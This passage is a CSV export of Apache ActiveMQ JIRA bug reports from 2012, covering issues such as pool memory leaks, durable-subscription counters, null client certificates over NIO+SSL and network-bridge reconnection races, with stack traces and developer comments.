https://issues.apache.org/jira/browse/AMQ-5994 https://issues.apache.org/jira/browse/AMQ-4000 - proper fix for duplicate sub info from the store on recovery failure from AMQ2149Test. Additional test from Christopher L

(cherry picked from commit dc06c8dc7540233aad6722afe554c2ea505754e2)
;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Unsubscribing durable subs can be blocked on calls to determine store size, contending with active subs",AMQ-3999,12605205,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,28/Aug/12 11:36,28/Aug/12 12:08,14/Jul/23 05:43,28/Aug/12 12:08,5.6.0,,,,,5.7.0,,,Broker,,,,0,,,,,,,,,"
Here is the stack trace showing the thread that is making the call to the getMessageCount when a sub is unsubscribing. This causes unnecessary contention with message addition and can result is pauses. Is it really necessary?

{code}ActiveMQ Transport: tcp:///127.0.0.1:54115
sun.misc.Unsafe.park at line #-2
java.util.concurrent.locks.LockSupport.park at line #186
java.util.concurrent.locks.AbstractQueuedSynchronizer.parkAndCheckInterrupt at line #834
java.util.concurrent.locks.AbstractQueuedSynchronizer.acquireQueued at line #867
java.util.concurrent.locks.AbstractQueuedSynchronizer.acquire at line #1197
java.util.concurrent.locks.ReentrantReadWriteLock$WriteLock.lock at line #945
org.apache.activemq.store.kahadb.KahaDBStore$KahaDBTopicMessageStore.getMessageCount at line #782
org.apache.activemq.store.ProxyTopicMessageStore.getMessageCount at line #116
org.apache.activemq.broker.region.cursors.TopicStorePrefetch.getStoreSize at line #83
org.apache.activemq.broker.region.cursors.AbstractStoreCursor.resetSize at line #66
org.apache.activemq.broker.region.cursors.AbstractStoreCursor.gc at line #246
org.apache.activemq.broker.region.cursors.StoreDurableSubscriberCursor.stop at line #98
org.apache.activemq.broker.region.DurableTopicSubscription.deactivate at line #171
org.apache.activemq.broker.region.TopicRegion.removeConsumer at line #164
org.apache.activemq.broker.region.RegionBroker.removeConsumer at line #473
org.apache.activemq.broker.jmx.ManagedRegionBroker.removeConsumer at line #266
org.apache.activemq.broker.BrokerFilter.removeConsumer at line #117
org.apache.activemq.broker.BrokerFilter.removeConsumer at line #117
org.apache.activemq.broker.MutableBrokerFilter.removeConsumer at line #123
org.apache.activemq.broker.TransportConnection.processRemoveConsumer at line #580
org.apache.activemq.broker.TransportConnection.processRemoveSession at line #617
org.apache.activemq.command.RemoveInfo.visit at line #74
org.apache.activemq.broker.TransportConnection.service at line #291
org.apache.activemq.broker.TransportConnection$1.onCommand at line #149
org.apache.activemq.transport.MutexTransport.onCommand at line #50
org.apache.activemq.transport.WireFormatNegotiator.onCommand at line #113
org.apache.activemq.transport.AbstractInactivityMonitor.onCommand at line #229
org.apache.activemq.transport.TransportSupport.doConsume at line #83
org.apache.activemq.transport.tcp.TcpTransport.doRun at line #215
org.apache.activemq.transport.tcp.TcpTransport.run at line #197
java.lang.Thread.run at line #722{code}",,gtully,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,249716,,,Tue Aug 28 12:08:31 UTC 2012,,,,,,,,,,,"0|i0agnr:",58972,,,,,,,,,,,,,,,,,,,,,"28/Aug/12 12:08;gtully;fix in http://svn.apache.org/viewvc?rev=1378085&view=rev

;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Incorrect reporting of pendingQueueSize of durable subs after reconnect with unacked,AMQ-3998,12605203,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,28/Aug/12 11:28,02/May/13 02:29,14/Jul/23 05:43,29/Aug/12 13:33,5.6.0,,,,,5.7.0,,,Broker,,,,0,,,,,,,,,"A durable sub that does not ack messages, so uses a transaction of client ack and connects then disconnects results in duplicate tally of the pending message count for the active sub (keepdurablesubsactive must be at default true). This issue emerged post fixes for https://issues.apache.org/jira/browse/AMQ-3871",,gtully,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-2801,,,,,,,,,,,,,,,,,,,AMQ-3871,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,249766,,,Wed Aug 29 13:33:28 UTC 2012,,,,,,,,,,,"0|i0ahdb:",59087,,,,,,,,,,,,,,,,,,,,,"28/Aug/12 11:31;gtully;The test from AMQ-2801 (which was disabled in the pom) works with the fix;;;","28/Aug/12 12:07;gtully;fixed in http://svn.apache.org/viewvc?rev=1378085&view=rev

issue was recalculating size and also reading messages back into pending. Deferring size recalculation to resetBatch resolves.;;;","28/Aug/12 14:27;gtully;The fix upsets the test for - org.apache.activemq.bugs.AMQ3934Test
AMQ-3934 
investigating;;;","29/Aug/12 13:33;gtully;test regression resolved with http://svn.apache.org/viewvc?rev=1378542&view=rev

duplicate calls to resetBatch on start caused an extra reread of the store which pulled out a message about to be deleted in error.
resetting is now only called from gc.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Memory leak in activemq-pool,AMQ-3997,12605199,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,davsclaus,davsclaus,28/Aug/12 10:22,30/Aug/12 08:58,14/Jul/23 05:43,28/Aug/12 12:22,5.6.0,,,,,5.7.0,,,Pool,,,,0,leak,,,,,,,,"The org.apache.activemq.pool.PooledConnectionFactory from activemq-pool has a severe memory leak when using it for sending a lot of messages. Over time this causes memory to be eaten up.

I have tracked it down to the following tickets:
- AMQ-3680, which keeps adding event listeners, despite previously added
- AMQ-2643, code which keep track of loaned sessions, causing JVM to create too many ConcurrentLinkedQueue$Node instances

There may be others. But with resolutions to those I can get the pool to not eat memory, and keep memory consumption low.",,boday,davsclaus,gtully,mattg,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"28/Aug/12 11:12;davsclaus;AMQ-3997.patch;https://issues.apache.org/jira/secure/attachment/12542746/AMQ-3997.patch","28/Aug/12 11:05;davsclaus;bad.png;https://issues.apache.org/jira/secure/attachment/12542744/bad.png","28/Aug/12 11:08;davsclaus;good.png;https://issues.apache.org/jira/secure/attachment/12542745/good.png",,,,,,,,,,,,,,,,,,,3.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,249767,,,Tue Aug 28 12:22:16 UTC 2012,,,,,,,Patch Available,,,,"0|i0ahdj:",59088,,,,,,,,,,,,,,,,,,,,,"28/Aug/12 10:24;davsclaus;The issues was brought to my attention from this forum thread, which we got notified about on the Camel @dev list
http://forum.springsource.org/showthread.php?128152-Spring-Integration-2-1-request-reply-benchmark-tests-showed-very-poor-performance

Running the sample code, will cause the memory issue. However switching to use a Spring based Cached connection factory, causes no problem, and has no memory leaks. But using the AMQ pool instead causes the leak.

;;;","28/Aug/12 11:04;davsclaus;This is the AMQ pooled configuration I am using in that test from the link above, the code from the github project
{code:xml}

	<bean id=""connectionFactory"" class=""org.apache.activemq.pool.PooledConnectionFactory"" init-method=""start"" destroy-method=""stop"">
		<property name=""maxConnections"" value=""1"" />
		<property name=""maximumActive"" value=""10""/>
		<property name=""connectionFactory"">
			<bean class=""org.apache.activemq.ActiveMQConnectionFactory"">
				<property name=""brokerURL"" value=""tcp://localhost:61616"" />
			</bean>
		</property>
	</bean>
{code};;;","28/Aug/12 11:05;davsclaus;bad.png is is a screenshot before the fix;;;","28/Aug/12 11:08;davsclaus;good.png is a screenshot with the fix. ;;;","28/Aug/12 11:12;davsclaus;patch with fix;;;","28/Aug/12 12:22;gtully;Patch applied with thanks in http://svn.apache.org/viewvc?rev=1378098&view=rev;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
NIO + SSL: Client certificates are null,AMQ-3996,12605185,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,francesco.romano,francesco.romano,28/Aug/12 07:52,23/Oct/12 15:20,14/Jul/23 05:43,22/Oct/12 12:44,5.6.0,5.7.0,,,,5.8.0,,,,,,,3,,,,,,,,,"If using protocol nio+ssl, the ConnectionInfo transportContext property does not contains peer certificates (which are present in the plain tcp ssl transport).

The problem is that in the NIO transport, calling sslSession.getPeerCertificates() returns null.",,ceposta,cghersi,davsclaus,francesco.romano,lionel.cons,mpaladin,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"23/Oct/12 13:11;mpaladin;AMQ3996.tgz;https://issues.apache.org/jira/secure/attachment/12550451/AMQ3996.tgz","17/Oct/12 18:50;tabish;NIOSSLTransportWithJaasCertificateAuthBrokerTest.java;https://issues.apache.org/jira/secure/attachment/12549551/NIOSSLTransportWithJaasCertificateAuthBrokerTest.java","29/Aug/12 15:31;ceposta;NIOSSLTransportWithJaasCertificateAuthBrokerTest.java;https://issues.apache.org/jira/secure/attachment/12542931/NIOSSLTransportWithJaasCertificateAuthBrokerTest.java","29/Aug/12 13:30;ceposta;NIOSSLTransportWithJaasCertificateAuthBrokerTest.java;https://issues.apache.org/jira/secure/attachment/12542919/NIOSSLTransportWithJaasCertificateAuthBrokerTest.java","29/Aug/12 15:31;ceposta;broker-jaas-ssl-nio.xml;https://issues.apache.org/jira/secure/attachment/12542930/broker-jaas-ssl-nio.xml","03/Sep/12 11:49;francesco.romano;nio+ssl.png;https://issues.apache.org/jira/secure/attachment/12543535/nio%2Bssl.png","03/Sep/12 11:49;francesco.romano;ssl.png;https://issues.apache.org/jira/secure/attachment/12543536/ssl.png",,,,,,,,,,,,,,,7.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,248946,,,Tue Oct 23 15:20:25 UTC 2012,,,,,,,,,,,"0|i0a2nj:",56703,,,,,,,,,,,,,,,,,,,,,"28/Aug/12 22:42;tabish;Added the missing code to NIOSSLTransport to attempt to set the property on the ConnectionInfo if the certificates are available.

You can try out the next 5.7-SNAPSHOT and see if this works for you. ;;;","29/Aug/12 13:00;francesco.romano;Sorry... I can't change right now the version of ActiveMQ.

Are the changing only in the NIOSSLTransport class? I can compile it from the 5.7 sources and ""inject"" it (only the class) in my 5.6 jar ? ;;;","29/Aug/12 13:07;tabish;Yes, changes in NIOSSLTransport, see the source tab for this issue to review the changeset.;;;","29/Aug/12 13:28;ceposta;Tim, 
I tried that too, doesn't seem to solve it.
The JaasCertificateAuthenticationPlugin seems to require the certificate from the connection also, so I've written a test for NIO+SSL that uses that auth plugin. It will fail also because of this JIRA. I'll attach test case;;;","29/Aug/12 13:30;ceposta;Testcase;;;","29/Aug/12 13:49;francesco.romano;I tested and it does not work.
The SSLSession in NIO has almost everything null (also local certificate and peer certificate).

The ""toString"" of the eclipse debug shows this:
[Session-1, SSL_NULL_WITH_NULL_NULL]
In the ""standard"" ssl it shows
[Session-1, SSL_RSA_WITH_RC4_128_MD5]

If you need other information just ask :)
;;;","29/Aug/12 15:31;ceposta;Updated my test case... first version didn't set up client credentials properly;;;","29/Aug/12 16:01;tabish;The 'SSL_NULL_WITH_NULL_NULL' issue is because the initial call we make to get the sslSession returns an session that's not initialized since the getSession() method can't block.  To fix that we need to update our sslSession in the finishHandshake() method.;;;","29/Aug/12 18:59;tabish;@Christian the config for the nio+ssl in the attached xml should be transport.needClientAuth=true although that doesn't actually make things work it at least sets the option to require the client to send its cert.  ;;;","29/Aug/12 19:09;ceposta;@Tim good catch, thank you!;;;","29/Aug/12 19:14;tabish;Added the change to update the SSLSession instance post handshake so that the session in use contains accurate data about the cipher suites etc that are in play for that current session. ;;;","03/Sep/12 11:48;francesco.romano;It's a bit better... Now at least the session is no more empty.
But still some information are missing.. in particular information about the host (ip and port) and the peer certificates.

I attach two screenshot of the debug window in eclipse for ssl and nio+ssl;;;","16/Oct/12 09:24;davsclaus;Francesco, so are you indicating that on the 2 screenshots, the nio+ssl has some details missing that are on the ssl screenshot?;;;","16/Oct/12 09:27;davsclaus;Tim do you have some time to work on this. It would be great to get fixed for 5.8.0 release.;;;","16/Oct/12 09:44;lionel.cons;We use X.509 authentication on our SSL connectors.

Because of this bug, STOMP+NIO+SSL authentication always fails with: java.lang.SecurityException: User name [null] or password is invalid.;;;","16/Oct/12 15:15;cghersi;Hi Claus, I'm a colleague of Francesco Romano , and I 'mwriting on behalf of him.

If you compare the two screenshots, you'll find that the peerCerts field is null in nio+ssl environment and is valued in ssl one.

;;;","17/Oct/12 18:50;tabish;Updated test case, self contained now so we don't need the broker xml config file.;;;","17/Oct/12 18:51;tabish;This one's got be a bit stumped.;;;","17/Oct/12 21:24;tabish;Ok, committed what I believe is the fix for all this now.  In order to test it fully you need to completely setup the Jaas Certificate stuff with the login.config files and such.  For those with the proper config I'd appreciate if you can test out the next SNAPSHOT build and see if this resolves all the problems. ;;;","18/Oct/12 05:47;lionel.cons;Tim, could you please be a bit more specific in what is needed in terms of configuration?

We use the jaasDualAuthenticationPlugin with two domains configured in login.config (one with SSL, the other one without) and this works fine with stomp+ssl.

Changing the connector to stomp+nio+ssl breaks the authentication (we get java.lang.SecurityException: User name [null] or password is invalid).

Do we need to add configuration bits that are specific to NIO?;;;","18/Oct/12 12:35;tabish;There's nothing specific to NIO.  The configuration is the same.  See this documentation on the setup for JaasCertificateAuthenticationPlugin
http://fusesource.com/docs/broker/5.3/security/Auth-JAAS-CertAuthentPlugin.html;;;","18/Oct/12 12:38;ceposta;Tried it out, and it works.

At first I was getting the same errors that Lionel was getting (it got past that part in JaasCertificateAuthenticationBroker.addConnection() where it was making sure the TransportContext was an instance of X509Certificate which is where it was failing previously, but then it would fail at the call to LoginContext.login() with User name [null] or password invalid error) but then I changed the user.properties a little bit to match what the client was presenting in its cert and my tests passed.;;;","18/Oct/12 13:39;lionel.cons;Christian, in our case the exact same user.properties file works fine without NIO. It is strange that enabling NIO would change the certificate format... What did you change to have your tests pass?;;;","18/Oct/12 13:47;ceposta;Lionel,

I changed the user.properties file referenced by my login.conf to match the client with what was in the cert. 

client=CN=client, OU=activemq, O=apache
#client=CN=client, OU=activemq, O=apache, L=Unknown, ST=Unknown, C=Unknown

Now that I think about it, I should have verified the client's cert to make sure it wasn't indeed passing the data in the commented out (second) line and that the SSL code only saw the first line.

;;;","19/Oct/12 06:09;lionel.cons;Christian/Tim, in our setup, we use the jaasDualAuthenticationPlugin. Its code contains:

{code}
   isSSL = (transportConnector.getServer() instanceof SslTransportServer);
{code}

This does not seem to be correct with NIO. Could you please check if you can make cert auth work with jaasDualAuthenticationPlugin?;;;","19/Oct/12 16:23;tabish;Ok, think that's all fixed now as well.  Would be good to validate under your own configuration using the next nightly SNAPSHOT to ensure I got it all sorted. ;;;","22/Oct/12 12:44;tabish;This is now fixed on trunk. ;;;","23/Oct/12 13:11;mpaladin;Hello,

it still fails for us with jaasDualAuthenticationPlugin and certificate authentication.
Attached you find the unit test with its configuration files.;;;","23/Oct/12 13:26;tabish;Issues with the Jaas Authentication isn't related to the certificates not being present any longer so I'd recommend you open a new issue for this test so we can track that work there.;;;","23/Oct/12 15:20;mpaladin;Ok, I opened AMQ-4126.;;;",,,,,,,,,,,,,,,,,,,,,,,,,
PListTest.testSerialAddIterate runs for over 30 minutes on Hudson nodes,AMQ-3995,12605087,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,kearls,kearls,27/Aug/12 15:27,27/Aug/12 18:27,14/Jul/23 05:43,27/Aug/12 18:27,,,,,,5.7.0,,,Test Cases,,,,0,,,,,,,,,"The PListTest.testSerialAddIterate takes over 30 minutes when run under Hudson on an EC2 medium node.  This should be removed, as testConcurrentAddIterate is a better test anyway",Medium EC2 node,kearls,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"27/Aug/12 15:27;kearls;PListTest.patch;https://issues.apache.org/jira/secure/attachment/12542611/PListTest.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,249768,,,Mon Aug 27 18:27:11 UTC 2012,,,,,,,Patch Available,,,,"0|i0ahdr:",59089,,,,,,,,,,,,,,,,,,,,,"27/Aug/12 18:27;tabish;Fix added to trunk, thanks.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
DefaultDatabaseLocker will leak pooled connections on link failure,AMQ-3994,12605079,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,davsclaus,pbridger,pbridger,27/Aug/12 14:13,10/Sep/12 17:01,14/Jul/23 05:43,10/Sep/12 17:01,5.6.0,,,,,5.7.0,,,Message Store,,,,0,,,,,,,,,"When the broker has lost the connection to the database through external issues -- link or database goes down, the process broker will stop().
When it is shutting down, it calls on each component (service) to stop().
The DefaultDatabaseLocker when stopping will test the connection to see if it is open or not before calling close() on the connection. Given that the connection was closed due to a link failure, the connection is never returned to the pool, hence the leak.

In this same file there is a comment in start() which warns about being careful about connection leaks.


",,davsclaus,pbridger,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"10/Sep/12 14:04;pbridger;DefaultDatabaseLocker.java.patch;https://issues.apache.org/jira/secure/attachment/12544468/DefaultDatabaseLocker.java.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,249769,,,Mon Sep 10 17:01:01 UTC 2012,,,,,,,Patch Available,,,,"0|i0ahdz:",59090,,,,,,,,,,,,,,,,,,,,,"08/Sep/12 09:22;davsclaus;Philip, you have marked [x] in patch available. Are you working on a patch?;;;","10/Sep/12 14:04;pbridger;Patch file from tag of 5.6.0

Apologies for not attaching it when creating the issue.
;;;","10/Sep/12 17:01;davsclaus;Thanks for the patch.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
NetworkBridge sometimes stops trying to reconnect after connection is lost,AMQ-3993,12605058,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,ron.koerner,ron.koerner,27/Aug/12 10:52,02/May/13 02:30,14/Jul/23 05:43,05/Nov/12 22:55,5.6.0,,,,,5.8.0,,,,,,,0,,,,,,,,,"After losing connection due to shutdown of the peer the broker tries to rebuild the connection once, fails again and stops trying afterwards.

While this also happens with a standard setup, it seems to happen much more often with a certain type of firewall which always accepts a connection, but closes it if the real destination cannot be reached.

This can be simulated by using a ""socat"" forwarder between the two brokers.

The problems seems to lie in the following sequence of events, a race condition and the use of {{event.failed}} in {{SimpleDiscoveryAgent.serviceFailed}} and {{bridges}} in {{DiscoveryNetworkConnector}}:

# connection ""failure"" due to ShutdownInfo
#- event.failed=true
#- bridge is unregistered
# start establishing a new connection
#- event.failed=false
#- bridge is not yet registered
# second connection failure of the old connection due to EOF
#- not blocked, since event.failed==false
#- event.failed=true
#- bridge would be unregistered, but currently there is none
#- wait one second (continued below)
# new connection is started
#- bridge is registered
# receive multiple connection failures of the new connection
#- all blocked, since event.failed=true
# continue after one second, try to establish a new connection
#- blocked, since bridge is already registered

To fix this problem a NetworkBridge should probably not be allowed to call {{SimpleDiscoveryAgent.serviceFailed}} more than once, since {{event.failed}} cannot keep track of multiple connections at one time.

The chain of events holds a lot of race conditions. If the second failure of the old connection occurs before the new connection is started (which seems to be the case most of the time) or the new connection's bridge is registered before the EOF occurs, the problem does not manifest.

Attached is a log excerpt with my comments about the state of event.failed and bridges.
",using static:// networkConnector (i.e. SimpleDiscoveryAgent),ron.koerner,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-4159,AMQ-4160,,,,,,,,,,,,"27/Aug/12 10:53;ron.koerner;reconnect-problem-annotated.txt;https://issues.apache.org/jira/secure/attachment/12542590/reconnect-problem-annotated.txt",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,249862,,,Wed Dec 12 22:44:16 UTC 2012,,,,,,,,,,,"0|i0al9z:",59720,,,,,,,,,,,,,,,,,,,,,"05/Nov/12 22:55;tabish;This bit should be fixed by AMQ-4159 and AMQ-4160;;;","12/Dec/12 22:44;guerrero;AMQ-3993 supposedly fixed by AMQ-4159 and AMQ-4160, so linking.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Zero Prefetch consumers increment the Enqueue Counter when the pull times out,AMQ-3992,12604917,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,tabish,tabish,tabish,24/Aug/12 20:07,24/Aug/12 20:40,14/Jul/23 05:43,24/Aug/12 20:40,5.6.0,,,,,5.7.0,,,Broker,,,,0,,,,,,,,,A message consumer that has a Zero prefetch is informed that its pull request has timed out via a Null Message response from the broker.  Currently this response is causing the subscription enqueue counter to be incremented with each timed out pull request leading to confusing statistics on the subscription.  We should filter out the control message from increments of the enqueue counter.,,tabish,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,249770,,,Fri Aug 24 20:40:08 UTC 2012,,,,,,,,,,,"0|i0ahe7:",59091,,,,,,,,,,,,,,,,,,,,,"24/Aug/12 20:40;tabish;fix applied to trunk.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ActiveMQSslConnectionFactory.setKeyAndTrustManagers does not work with failover enabled using 5.7 snapshot Jars,AMQ-3989,12604639,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,bryce,bryce,23/Aug/12 16:47,11/Sep/12 12:12,14/Jul/23 05:43,11/Sep/12 12:12,5.5.1,5.6.0,5.7.0,,,5.7.0,,,,,,,0,,,,,,,,,"I've been using ActiveMQ with SSL enabled for months now. After enabling failover on the broker and connecting using a failover URL I get this error:

certificate_unknown

I find two workaround: one using System.setProperty, the other using Thread.setSslContext. But these are workarounds and I'd rather do things the appropriate way. 

This is similar to the issue posted in this JIRA:
https://issues.apache.org/jira/browse/AMQ-3785. The issue is marked as resolved but I am still getting that error using 5.7 snapshot Jars.

I'll attach a zip file containing very simple code and test case.",GNU/Linux (shouldn't matter too much) using a SslBroker embedded in Java code running in Tomcat (I've tested it without Tomcat and the same thing happens).,bryce,gtully,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"23/Aug/12 16:49;bryce;ActiveMQFailoverTest.zip;https://issues.apache.org/jira/secure/attachment/12542153/ActiveMQFailoverTest.zip",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,249772,,,Tue Sep 11 12:12:30 UTC 2012,,,,,,,,,,,"0|i0ahen:",59093,,,,,,,,,,,,,,,,,,,,,"23/Aug/12 16:49;bryce;Here it is.

It contains a readme.txt file with very simple instructions on running it.

The SSL failover fails with a certificate_unknown error using
ActiveMQSslConnectionFactory.setKeyAndTrustManagers

If, however, that line of code is commented out and Thread.setSslContext is used instead it does work.;;;","11/Sep/12 12:12;gtully;thanks for the nice test case :-)
Fix and additional junit test in http://svn.apache.org/viewvc?rev=1383370&view=rev;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
PooledSession throw Exception at closing,AMQ-3988,12604624,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,davsclaus,harley,harley,23/Aug/12 15:22,20/Nov/12 14:00,14/Jul/23 05:43,30/Aug/12 11:16,5.6.0,,,,,5.7.0,,,Camel,JMS client,Pool,,1,,,,,,,,,"Using ActiveMQ library 5.6.0 with Camel 2.10, the PooledSession is throwing IllegalStateException at shutdown application time.

With the version 5.4.2 of ActiveMQ library there is not such behavior.

{code}
2012-08-23 12:08:48,274 [WARN] PooledSession(122): Caught exception trying close() when putting session back into the pool, will invalidate. javax.jms.IllegalStateException: The Session is closed 
javax.jms.IllegalStateException: The Session is closed
	at org.apache.activemq.ActiveMQSession.checkClosed(ActiveMQSession.java:731) ~[activemq-core-5.6.0.jar:5.6.0]
	at org.apache.activemq.ActiveMQSession.setMessageListener(ActiveMQSession.java:813) ~[activemq-core-5.6.0.jar:5.6.0]
	at org.apache.activemq.pool.PooledSession.close(PooledSession.java:99) ~[activemq-pool-5.6.0.jar:5.6.0]
	at org.springframework.jms.support.JmsUtils.closeSession(JmsUtils.java:108) [spring-jms-3.0.7.RELEASE.jar:3.0.7.RELEASE]
	at org.springframework.jms.listener.DefaultMessageListenerContainer$AsyncMessageListenerInvoker.clearResources(DefaultMessageListenerContainer.java:1099) [spring-jms-3.0.7.RELEASE.jar:3.0.7.RELEASE]
	at org.springframework.jms.listener.DefaultMessageListenerContainer$AsyncMessageListenerInvoker.run(DefaultMessageListenerContainer.java:999) [spring-jms-3.0.7.RELEASE.jar:3.0.7.RELEASE]
	at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886) [na:1.6.0_33]
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908) [na:1.6.0_33]
